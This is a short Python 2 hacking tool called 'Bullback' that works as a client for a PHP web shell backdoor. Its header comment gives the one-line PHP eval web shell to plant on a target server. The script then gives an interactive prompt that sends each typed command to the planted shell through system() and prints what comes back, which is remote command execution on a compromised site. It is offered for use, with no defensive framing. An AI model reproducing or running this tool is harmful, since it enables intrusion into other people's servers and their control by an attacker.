#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2014 @jofpin  <mrjopino@gmail.com>
#
#################
import requests #
#################################################
#                                               #
# Code: <?php eval($_GET["cmd"]); ?>            ##############
# It generates an effective rear connection with eval()      #
# Example: http://target.com/shell.php?cmd=     ##############
#                                               #
#################################################
#
# Bullback > backdoor connection!
# For bullgit
#

# Colors
color = {"blue": "\033[94m", "green": "\033[92m", "white": "\033[0m"}

target = raw_input(color['blue'] + "Insert target -> " + color['white'])

if target:
    print "\t\t--------------" + color['green'] + "bullback" + color['white'] + "------------"
    print "\t\tx      Developed by @mrjopino    x"
    print "\t\tx           happy hacker         x"
    print "\t\t----------------------------------\n\n"

    while True:

        cmd = raw_input("bullb:~$ ")
        if cmd == "exit":
            break
        else:
            php = "system('" + cmd + "');"
            boom = target + php
            request = requests.get(boom)
            print color['green'] + request.text.strip() + color['white']
